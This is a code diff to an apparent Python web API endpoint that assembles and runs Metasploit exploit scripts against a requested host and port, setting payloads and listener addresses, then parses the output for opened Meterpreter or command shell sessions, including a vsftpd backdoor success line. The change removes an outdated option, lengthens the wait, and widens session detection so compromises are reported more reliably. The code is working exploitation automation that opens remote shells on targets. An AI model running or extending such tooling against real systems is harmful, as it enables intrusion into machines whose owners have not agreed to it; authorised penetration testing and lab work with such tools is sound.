@@ -4464,15 +4464,17 @@ async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
     lhost_block = f"set LHOST {effective_lhost}\nset LPORT {req.lport}\n" if needs_lhost and effective_lhost else ""
     payload_block = "" if is_backdoor_module else f"set PAYLOAD {payload}\n"
 
+    # ExitOnSession is an UNKNOWN option in modern MSF (raises a warning).
+    # Removed. `run -j` already detaches; we use `sleep` to let the staged
+    # payload land and the session to open before we list and exit.
     rc = (
         f"use {module}\n"
         f"set RHOSTS {host}\n"
         f"set RPORT {req.port}\n"
         + lhost_block +
         payload_block +
-        f"set ExitOnSession false\n"
         f"run -j\n"
-        f"sleep 25\n"
+        f"sleep 30\n"
         f"sessions -l\n"
         f"exit -y\n"
     )
@@ -4485,7 +4487,20 @@ async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
     except:
         pass
     out = result.get("output", "")
-    session_opened = "Meterpreter session" in out or "Command shell session" in out or "session 1 opened" in out.lower()
+    # Session detection — match several signals to avoid false negatives:
+    #   "Meterpreter session N opened"  ← Meterpreter payload landed
+    #   "Command shell session N opened" ← cmd shell payload landed
+    #   "meterpreter x86/linux" / "meterpreter cmd"  ← active session in `sessions -l` table
+    #   "Backdoor has been spawned" ← vsftpd backdoor module success line
+    # The "Exploit completed, but no session was created" line appears EARLIER
+    # in `run -j` output (before sleep), so we ignore it on its own.
+    out_low = out.lower()
+    session_opened = (
+        re.search(r"(meterpreter|command shell)\s+session\s+\d+\s+opened", out, re.IGNORECASE) is not None
+        or "session 1 opened" in out_low
+        or re.search(r"^\s*\d+\s+\S*\s+meterpreter\s+", out, re.MULTILINE) is not None
+        or "backdoor has been spawned" in out_low
+    )
     session_id_m = re.search(r'session (\d+) opened', out, re.IGNORECASE)
     session_id = int(session_id_m.group(1)) if session_id_m else (1 if session_opened else None)
     error = None
